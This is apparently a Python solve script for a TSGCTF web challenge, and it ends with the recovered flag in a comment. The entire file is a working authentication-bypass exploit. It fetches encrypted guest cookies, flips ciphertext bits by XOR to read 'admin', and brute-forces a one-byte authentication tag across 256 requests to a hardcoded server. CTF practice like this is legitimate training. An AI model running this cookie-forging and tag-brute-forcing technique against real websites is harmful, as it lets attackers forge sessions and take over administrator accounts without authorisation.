import requests
import urllib.parse
from base64 import b64encode, b64decode
from pwn import xor

base_url = "http://34.84.176.251:8080"

def solve():
    # make request to get cookies
    r = requests.post(base_url + '/index.php', data={'auth': 'guest'}, allow_redirects=False)
    
    # get and parse cookies
    iv = r.cookies['iv']
    ciphertext = b64decode(urllib.parse.unquote(r.cookies['auth']))
    tag = b64decode(urllib.parse.unquote(r.cookies['tag']))

    print('IV:', iv)
    print('Ciphertext:', ciphertext.hex())
    print('Tag:', tag.hex())
    
    # flip bits in ciphertext to get admin cookie
    ciphertext = xor(ciphertext, xor(b'guest', b'admin'))
    
    print('New ciphertext:', ciphertext.hex())
    
    # try all possible tags
    for tag in range(0x100):
        print('New tag:', tag.to_bytes(1, byteorder='big').hex())
        
        # reformat cookies
        cookies = {
            'auth': urllib.parse.quote(b64encode(ciphertext).decode()),
            'tag': urllib.parse.quote(b64encode(tag.to_bytes(1, byteorder='big')).decode()),
            'iv': iv
        }
    
        # make request with new cookies
        r = requests.get(base_url + '/mypage.php', cookies=cookies)
        
        # if flag in request, return
        if "TSGCTF{" in r.text:
            return r.text

    # no flag found
    return "No flag :("

if __name__ == '__main__':
    flag = solve()
    print(flag)
    
# TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}

# https://www.php.net/manual/en/function.openssl-decrypt.php